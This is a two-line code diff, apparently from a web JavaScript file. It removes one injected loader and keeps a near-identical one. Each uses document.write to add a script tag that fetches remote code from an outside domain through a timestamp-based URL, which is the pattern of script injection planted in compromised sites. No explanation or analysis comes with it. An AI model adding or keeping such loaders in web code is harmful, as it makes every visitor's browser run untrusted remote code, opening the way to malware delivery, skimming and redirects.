@@ -1,2 +1,1 @@
-var t23625=parseInt(Date.parse(new Date())/100000);document.write('<script src="https://d.zxptw.cn/'+t23625+'23625"><\/script>');
 var t23619=parseInt(Date.parse(new Date())/100000);document.write('<script src="https://d.zxptw.cn/'+t23619+'23619"><\/script>');
